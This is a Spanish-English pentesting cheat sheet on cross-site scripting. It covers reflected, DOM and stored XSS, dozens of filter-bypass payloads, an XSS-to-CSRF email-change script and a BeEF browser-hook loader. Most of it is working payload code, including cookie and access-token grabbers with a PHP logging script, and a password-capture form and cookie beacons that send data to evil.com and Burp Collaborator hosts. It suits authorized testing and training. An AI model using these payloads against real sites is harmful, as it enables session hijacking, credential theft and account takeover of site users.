
- [Detalles de la vulnerabilidad](#Detalles-de-la-vulnerabilidad)
- [Obtencion de datos por XSS](#obtencion-de-datos-por-xss)
  - [XSS captura de contraseñas](#xss-captura-de-contraseñas)
  - [CORS](#cors)
- [XSS en HTML/Aplicationes](#xss-en-htmlaplicationes)
  - [Payloads comunes](#payloads-comunes)
- [DOM based XSS](#dom-based-xss)
  - [DOM based XSS innerHTML sink](#dom-based-xss-innerhtml-sink)
  - [DOM XSS en document.write sink usando fuente location.search dentro de un select](#dom-xss-en-documentwrite-sink-usando-fuente-locationsearch-dentro-de-un-select)
  - [DOM XSS en AngularJS](#dom-xss-en-angularjs)
- [XSS in JS Context](#xss-in-js-context)
  - [jQuery anchor href attribute sink](#jquery-anchor-href-attribute-sink)
  - [jQuery selector sink using an event](#jquery-selector-sink-using-an-event)
- [XSS en archivos](#xss-en-archivos)
  - [XSS in XML](#xss-in-xml)
  - [XSS in SVG](#xss-in-svg)
- [Reflected XSS in canonical link tag](#reflected-xss-in-canonical-link-tag)
- [XSS to CSRF](#xss-to-csrf)
- [Filter Bypass and exotic payloads](#filter-bypass-and-exotic-payloads)
  - [Identificacion de elementos y etiquetas HTML permitidos](#identificacion-de-elementos-y-etiquetas-html-permitidos)
  - [Bypass case sensitive](#bypass-case-sensitive)
  - [Bypass etiquetas y elementos html usando `body` y `onresize()`](#bypass-etiquetas-y-elementos-html-usando-body-y-onresize)
  - [Bypass etiquetas y elementos html usando custom tags](#bypass-etiquetas-y-elementos-html-usando-custom-tags)
  - [Bypass palabras en blacklist](#bypass-palabras-en-blacklist)
  - [Bypass con etiquetas HTML incompletas](#bypass-con-etiquetas-html-incompletas)
  - [Bypass comillas por string](#bypass-comillas-por-string)
  - [Bypass comillas etiqueta script](#bypass-comillas-etiqueta-script)
  - [Bypass comillas en evento mousedown](#bypass-comillas-en-evento-mousedown)
  - [Bypass dobles comillas escapadas con \](#bypass-dobles-comillas-escapadas-con-\)
  - [Bypass dobles comillas y \ usando string JS](#bypass-dobles-comillas-y--usando-string-js)
  - [Bypass de `"`, `'` y `<>`](#bypass-de---y--)
  - [Bypass dobles comillas y <> HTML Encoding y ' y \ escapados con un evento `onclick`](#bypass-dobles-comillas-y--html-encoding-y--y--escapados-con-un-evento-onclick)
  - [Bypass filtro de punto](#bypass-filtro-de-punto)
  - [Bypass de parentesis por string](#bypass-de-parentesis-por-string)
  - [Bypass parentesis y punto y coma](#bypass-parentesis-y-punto-y-coma)
  - [Bypass ">" usando nada](#bypass-usando-nada)
  - [Bypass "<" y ">" usando ＜ y ＞](#bypass-y)
  - [Bypass de la funcion `replace()` para "<" y ">" usando ＜> ](#bypass-de-la-funcion-replace-para-y-usando--)
  - [Bypass "<" y ">" usando `onmouseover`](#bypass-y)
  - [Bypass "<" y ">" usando string JS](#bypass-y)
  - [Bypass Unicode “” ‘ <> \ `](#bypass-unicode--)
  - [Bypass ";" usando otro caracter](#bypass-usando-otro-caracter)
  - [Bypass usando HTML encoding](#bypass-usando-html-encoding)
- [Robo de cookies de sesion](#robo-de-cookies-de-sesion)
- [Beef Framework](#beef-framework)


## Detalles de la vulnerabilidad

Cross-Site Scripting (XSS) es un tipo de vulnerabilidad de seguridad informática que normalmente se encuentra en las aplicaciones web. XSS permite a los atacantes inyectar código malicioso en un sitio web, que luego se ejecuta en el navegador de cualquiera que visite el sitio. Esto puede permitir a los atacantes robar información confidencial, como las credenciales de inicio de sesión del usuario, o realizar otras acciones maliciosas.

Hay 3 tipos principales de ataques XSS:

XSS reflejado: en un ataque XSS reflejado, el código malicioso está incrustado en un enlace que se envía a la víctima. Cuando la víctima hace clic en el enlace, el código se ejecuta en su navegador. Por ejemplo, un atacante podría crear un enlace que contenga JavaScript malicioso y enviárselo a la víctima en un correo electrónico. Cuando la víctima hace clic en el enlace, el código JavaScript se ejecuta en su navegador, lo que permite al atacante realizar diversas acciones, como robar sus credenciales de inicio de sesión.

XSS almacenado: en un ataque XSS almacenado, el código malicioso se almacena en el servidor y se ejecuta cada vez que se accede a la página vulnerable. Por ejemplo, un atacante podría inyectar código malicioso en un comentario de una publicación de blog. Cuando otros usuarios ven la publicación del blog, el código malicioso se ejecuta en sus navegadores, lo que permite al atacante realizar diversas acciones.

XSS basado en DOM: es un tipo de ataque XSS que ocurre cuando una aplicación web vulnerable modifica el DOM (Document Object Model) en el navegador del usuario. Esto puede suceder, por ejemplo, cuando se utiliza una entrada del usuario para actualizar el código HTML o JavaScript de la página de alguna manera. En un ataque XSS basado en DOM, el código malicioso no se envía al servidor, sino que se ejecuta directamente en el navegador del usuario. Esto puede dificultar la detección y prevención de este tipo de ataques, porque el servidor no tiene ningún registro del código malicioso.

### Data grabber for XSS

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file.

```html
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

#### XSS capture passwords

````html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://evil.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
````

> Declaramos los campos de entrada de datos username y password, el de password le indicaremos que en caso que el campo cambie(onchange) (lo que pasará cada vez que entre un usuario distinto) y mientras el valor de la contraseña sea mayor a 0 (this.value.length)nos envíe la contraseña a nuestro dominio (fetch). Al final nos dará el valor del usuario (username.value) y la contraseña actual (this.value).

### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

## XSS in HTML/Applications

### Common Payloads

```js
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```


### DOM based XSS

Based on a DOM XSS sink.

```js
#"><img src=/ onerror=alert(2)>
```

#### DOM based XSS innerHTML sink
> El innerHTML sink no acepta elementos de secuencia de comandos en ningún navegador moderno, ni se activarán los eventos de carga de svg. Esto significa que necesitará usar elementos alternativos como img o iframe. Los controladores de eventos como onload y onerror se pueden usar junto con estos elementos.

````
<img src=1 onerror=alert(1)>
````
#### DOM XSS en document.write sink usando fuente location.search dentro de un select

En este caso se esta cogiendo el valor de storeId de la URL a partir del location.search

![image](https://github.com/n3masyst/Pentesting/assets/133997401/1ba153ba-6da9-409f-aa0f-8f23017637c1)

Esto permite manipular el input desde la URL ya que el select HTML de la pagina no permite input del usuario

````
http://www.test.com/product?productId=1&storeId=abc123
````

Al introducir un valor en el campo este se agrega dentro de un select 

![image](https://github.com/n3masyst/Pentesting/assets/133997401/0c232c22-b032-4458-9551-d882cc282b87)

Para explotar el XSS debemos cerrar el campo y despues el select

````
"></select><img%20src=1%20onerror=alert(1)>
````

#### DOM XSS in AngularJS
> Si se usa un marco como AngularJS, es posible ejecutar JavaScript sin <> ni eventos. Cuando un sitio usa el atributo ng-app en un elemento HTML, AngularJS lo procesará. En este caso, AngularJS ejecutará JavaScript dentro de llaves dobles que pueden ocurrir directamente en HTML o dentro de atributos.


Para confirmar que estamos en un marco de AngularJS buscaremos en el codigo fuente el elemento `ng-app`
![image](https://github.com/n3masyst/Pentesting/assets/133997401/b91419d6-fe14-459e-bcc9-4ad3f237621e)


Explotacion:
````
{{$on.constructor('alert(1)')()}}
````



### XSS in JS Context

```js
-(confirm)(document.domain)//
; alert(1);//
// (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
```

#### jQuery anchor href attribute sink

Si se utiliza una biblioteca de JavaScript como jQuery, podemos buscar sumideros que puedan alterar los elementos DOM en la página.

> Cuando los datos se leen de una fuente controlada por el usuario, como la URL, y luego se pasan a una funcion, entonces es posible manipular el valor enviado para causar XSS.

![image](https://github.com/n3masyst/Pentesting/assets/133997401/bbee2421-0429-4118-9677-1d29166810c6)

Podemos explotar esto modificando la URL para que la fuente location.search contenga una URL JavaScript maliciosa. Después de que el JavaScript de la página aplique esta URL maliciosa al href del vínculo de retroceso, al hacer clic en el vínculo de retroceso se ejecutará.

![image](https://github.com/n3masyst/Pentesting/assets/133997401/3e9123b0-01a8-45e2-a39a-a97ca1037c4e)

Si manipulamos el valor del parametro returnPath=/ poniendo un string cualquiera al inspeccionar elemento veremos que lo ha metido en un href

Por lo tanto si en vez de un string ponemos una funcion de javascript al pulsar el href del link de volver a la pagina anterior se ejecutara el XSS

````
javascript:alert(document.cookie)
javascript:alert(test)
````

````
/?returnPath=javascript:alert(document.cookie)
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/56151349-c478-4064-9758-b751316f03b1)

> Esta tecnica se aplica igual cuando los datos se leen de cualquier input de la web que no sea la url 

![image](https://github.com/n3masyst/Pentesting/assets/133997401/295ef0ba-9888-480e-86f3-2ddf32e3c5e2)

![image](https://github.com/n3masyst/Pentesting/assets/133997401/6602a58f-ac20-4576-b22d-ea9b931c3951)




#### jQuery selector sink using an event
Para explotar esta vulnerabilidad clásica, se deberá encontrar una manera de capturar un evento de de la web sin la interacción del usuario.

````
<iframe src="https://evil.com/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
````
El evento onload del <iframe> se activa cuando la página se ha cargado por completo. En este caso, se agrega una imagen a la URL de la página cargada, que tiene como origen la URL "1" y se dispara el evento onerror.

El evento onerror se activa cuando ocurre un error al cargar la imagen, y en este caso se llama a la función print(). Esto significa que cuando se carga la página, se inyecta una imagen con una URL que provocará un error al cargarla, y esto a su vez activará el evento onerror y ejecutará la función print() el cual puede ser sustituido por un payload malicioso.


## XSS en archivos

** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XSS in XML

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### XSS in SVG

SVG markup allowed

```html
"><svg><animatetransform onbegin=alert(1)>
```

1. "><svg>: cierra una etiqueta y abre otra etiqueta SVG.
2. <animatetransform>: inicia la animación transformadora de SVG.
3. onbegin=alert(1): establece el atributo onbegin de la animación transformadora en la cadena de JavaScript "alert(1)". Esto significa que cuando la animación comienza, se ejecutará el código "alert(1)"



### Reflected XSS in canonical link tag

> En este caso la función alert se activara cuando el usuario pulse la tecla de acceso que carga la pagina en este caso la x

````
?%27accesskey=%27x%27onclick=%27alert(1)
````

El elemento `"'accesskey='x'"` establece el atributo `accesskey` del elemento HTML en "x". El atributo `accesskey` es utilizado por algunos navegadores para permitir a los usuarios acceder a elementos específicos de una página mediante atajos de teclado.

El elemento `"onclick='alert(1)"` establece el atributo `onclick` del mismo elemento HTML para que muestre una alerta que dice "1" cuando se hace clic en el elemento.



## XSS to CSRF
Usaremos de ejemplo una request de cambio de email
![image](https://github.com/n3masyst/Pentesting/assets/133997401/46b45c41-07f2-4c7c-998e-333dab776016)

> Vemos que envía la petición a /my-account/change-email y envía el campo email junto con el de csrf. Esto significa que nuestro exploit debe cargar la página de usuario, extraer el token csrf y usarlo para cambiar el correo.

````js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

````


1. El código crea una nueva instancia de objeto XMLHttpRequest y define una función de devolución de llamada llamada handleResponse.

2. A continuación, se envía una solicitud HTTP GET a la ruta /my-account de la aplicación web.

3. Cuando se recibe la respuesta de la solicitud HTTP, la función de devolución de llamada handleResponse se activa. Esta función utiliza una expresión regular para extraer un token CSRF del cuerpo de la respuesta. El token se encuentra en un campo oculto en un formulario en la página /my-account.

4. Luego, se crea una nueva instancia de objeto XMLHttpRequest y se envía una solicitud HTTP POST a la ruta /my-account/change-email. En la solicitud, se incluye el token CSRF extraído y una dirección de correo electrónico de prueba.

## Filter Bypass and exotic payloads

### Identificacion de elementos y etiquetas HTML permitidos

Fuzzearemos con el Intruder en la posicion donde iria el valor de algun campo HTML y usaremos la [lista de XSS de Burpsuite](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

![image](https://github.com/n3masyst/Pentesting/assets/133997401/d4ac9b8e-305d-4ce5-8f68-da6b52e543c1)

![image](https://github.com/n3masyst/Pentesting/assets/133997401/ae5c89c3-1885-4dcd-ba54-6e863c436c67)

Una vez hayadas las etiquetas permitidas vamos a hacer lo mismo para los elementos

![image](https://github.com/n3masyst/Pentesting/assets/133997401/867a1901-3c93-42a6-ae48-94c98c99ab0e)

![image](https://github.com/n3masyst/Pentesting/assets/133997401/e8cf0a09-8e93-45a6-946d-5d1f8cf01742)

Una vez encontrados ambos estudiariamos como construir un script para explotar el XSS

### Bypass case sensitive

```js
<sCrIpt>alert(1)</ScRipt>
```

### Bypass etiquetas y elementos html usando `body` y `onresize()`

```js
<iframe src="https://evil.com/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

> El controlador de eventos "onresize" se dispara cada vez que se cambia el tamaño de la ventana del navegador y, en este caso, se utiliza para imprimir el contenido de la página.


### Bypass etiquetas y elementos html usando custom tags

> Las custom tags de HTML se pueden usar como cualquier otro elemento de la pagina web en esta ocasión crearemos una con el tag ID=x el cual contendrá un onfocus event handler que activará la alert

En este caso usaremos los elementos `onfocus` y `tabindex`

````
<script>
location = 'https://evil.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
````

>  Tabindex es un atributo de HTML que se utiliza para especificar el orden de tabulación de los elementos de la página. En este caso, el valor 1 se ha utilizado para establecer el orden de tabulación del elemento en primer lugar. Esto significa que cuando el usuario presiona la tecla Tab en el teclado, el foco se moverá automáticamente al elemento que tiene el valor tabindex más bajo. Al establecer el valor tabindex en 1, se asegura que el elemento tenga el foco cuando la página se carga por primera vez, lo que hará que se ejecute la función onfocus.


### Bypass palabras en blacklist

```js
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

### Bypass con etiquetas HTML incompletas

Works on IE/Firefox/Chrome/Safari

```js
<img src='1' onerror='alert(0)' <
```

### Bypass comillas por string

```js
String.fromCharCode(88,83,83)
```

### Bypass comillas en etiqueta string

```js
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

### Bypass comillas en evento mousedown

You can bypass a single quote with ' in an on mousedown event handler

```js
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
```

### Bypass dobles comillas escapadas con \

````
\"-alert(1)}//
````

> De esta manera poniendo una \ antes de las comillas hacemos que la respuesta del servidor añada una segunda \ para escapar las comillas resultando en el cierre del escape y por tanto su cancelación. Esto significa que las dobles comillas han sido procesadas sin escapar.

La request se veria de la siguiente manera:
````
{"searchTerm":"\\"-alert(1)}//", "results":[]}
````
### Bypass dobles comillas y \ usando string JS

> En caso que las dobles comillas se esten escapando con \ y esta tampoco podamos escaparla con `\\` , suponiendo que el filtro se encuentre dentro de un <script> podemos escaparlo de la siguiente manera
````html
</script><script>alert(1)</script>
````

### Bypass de `"`, `'` y `<>`
Las comillas estan siendo escapadaas con un \ por lo que poniendo otra mas permitimos que las comillas se interpreten resultando en `\\'`
````
\'-alert(1)//
````
### Bypass dobles comillas y <> HTML Encoding y ' y \ escapados con un evento `onclick`

El input se guarda en un onclick 
![image](https://github.com/n3masyst/Pentesting/assets/133997401/3bd09d3b-f2ed-4146-8627-71d2be6990b0)

Cuando se hace clic en un elemento HTML que tiene el atributo "onclick" con este código JavaScript, se crea una instancia del objeto "tracker" y se llama a su método "track" con la URL "http://abc1234" como argumento.
Por lo tanto debemos hacer que al pinchar en el link que generará el campo Website se conecte a una URL que active un alert.
````
http://foo?&apos;-alert(1)-&apos;
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/39ff50c4-a2ff-4a88-a6d6-18298e4983ad)

### Bypass filtro de punto

```js
<script>window['alert'](document['domain'])</script>
```

Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777` [http://www.geektools.com/cgi-bin/ipconv.cgi](http://www.geektools.com/cgi-bin/ipconv.cgi)

```js
<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
```

Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`

### Bypass parentesis por string

```js
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

### Bypass parentesis y punto y coma

```js
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

### Bypass ">" usando nada

You don't need to close your tags.

```js
<svg onload=alert(1)//
```

### Bypass "<" y ">" usando ＜ y ＞

Unicode Character U+FF1C and U+FF1E

```js
＜script/src=//evil.site/poc.js＞
```

### Bypass de la funcion `replace()` para "<" y ">" usando ＜> 
````
<><img src=1 onerror=alert(1)>
````
> En un intento por evitar XSS, el sitio web utiliza la función replace() de JavaScript para codificar <>. Sin embargo, cuando el primer argumento es una cadena, la función solo reemplaza la primera aparición. Aprovechamos esta vulnerabilidad simplemente al incluir un par adicional de <> al comienzo del comentario. Estos se codificarán, pero los corchetes angulares posteriores no se verán afectados, lo que nos permitirá omitir el filtro e inyectar HTML de manera efectiva.

### Bypass "<" and ">" usando `onmouseover`

> Este elemento se activa cuando el cursor del mouse se mueve sobre un elemento específico en una página web, como un botón, una imagen o un enlace.

````
"onmouseover="alert(1)
````

### Bypass "<" and ">" usando string JS
````
‘-alert(1)-’
````

Las comillas y los guiones se utilizan para encapsular y ocultar el payload dentro del código HTML. En este caso, los guiones ("-") no tienen una función específica en el código, ya que su única función es ocultar el payload malicioso dentro del código HTML.

Al utilizar los guiones en ambos extremos de la carga útil maliciosa, se intenta evitar que el código sea detectado y bloqueado por herramientas de seguridad o filtros que buscan patrones específicos de código malicioso.

### Bypass Unicode “” ‘ <> \ `
Vemos como al introducir estos caracteres son codificados

![image](https://github.com/n3masyst/Pentesting/assets/133997401/2756ed3c-04a9-448b-9b8d-73bac5eb8048)

Otros caracteres a probar: ` $ () / ! {} `

````
${alert(1)}
````
### Bypass ";" usando otro caracter

```js
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

### Bypass usando HTML encoding

```js
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```
## Robo de cookies de sesion

Para robar una cookie de sesion debemos saber que un usuario desde su lado de cliente va a ejecutar nuestro XSS el cual sera de tipo Stored, podemos saberlo a traves de mensajes del servidor donde se indique que se estan llevando a cabo ciertos tipos de validaciones o simplemente inyectarlo en una seccion de la pagina con gran actividad.

Una vez gemos identificado el punto de inyeccion la explotacion consistira en enviarnos a un servidor controlado por nosotros la cookie de sesion del usuario.

````
<script>document.write('img src="http://evil.com/cookie?=' + document.cookie + '">')</script>
````

Una vez el XSS esta almacenado en el servidor solo hay que esperar que los usuarios lo activen

![image](https://github.com/n3masyst/Pentesting/assets/133997401/3899275a-e724-450b-9ef9-bc9a1188c5b1)

## Beef Framework 

Beef nos permite enganchar el navegador de un usuario mediante un XSS, la explotacion es muy similar al robo de cookies pero cambiando nuestro servidor arbitrario por el de Beef

````
<script src="http://<beef_server>:3000/hook.js"></script>
````

Una vez capturado el navegador podemos analizar su version y sus plugins instalados y realizar todo tipo de ataques

![image](https://github.com/n3masyst/Pentesting/assets/133997401/cf91db59-956e-4b67-b491-96f42be970bb)

![image](https://github.com/n3masyst/Pentesting/assets/133997401/b972f88e-ae9d-48d6-b017-5b520e8c4f00)
